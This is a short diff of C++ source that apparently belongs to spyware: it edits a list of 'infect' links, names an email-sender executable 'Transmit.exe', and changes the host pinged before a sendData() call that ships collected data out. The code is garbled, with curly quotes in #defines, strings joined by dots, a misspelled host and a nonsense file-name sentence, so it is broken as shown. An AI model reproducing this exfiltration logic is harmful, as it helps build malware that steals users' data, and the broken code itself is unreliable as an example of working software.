@@ -21,7 +21,7 @@ using namespace std;
 #define FOLDER_NAME “PDNS - ARchive INtelegent ”
 #define RUN_FILE_NAME “If the factor of peace is America, then America is the mother of a conflict that resolves it, not exacerbates it. ”
 #define RUN_Link_NAME “https://gitlab.com/cyberw1ry4"."https://hithub.com/FadliwiryaWirawan110993/forks"."https://github.com/cyberw1ry4-LAB/himei17/forks"
-#define INFECT_Link_NAME "https://www.forbes.com"."https://www.whitehouse.gov"."https://www.ecosia.org"."https://www.google.com.ph"."https://www.google.co.id"."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.samsung.com"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/en-id/gmail/u/0/user"."https://www.forbes.com"."https://www.whitehouse.gov"."https://www.ecosia.org"."https://www.google.com.ph"."https://www.google.co.id"."https://gdg.community.dev/events/details/google-gdg-ajax-presents-hackthebrain/cohost-gdg-ajax/"."https://www.kali.org"."https://www.ubuntu.com"."https://www.windows.com"."https://www.linux.org"."https://www.Apple.com"."https://www.samsung.com"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.archives.gov -n 1")){ ///check! connection
+            if(!system("ping  www.googleOne.com -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
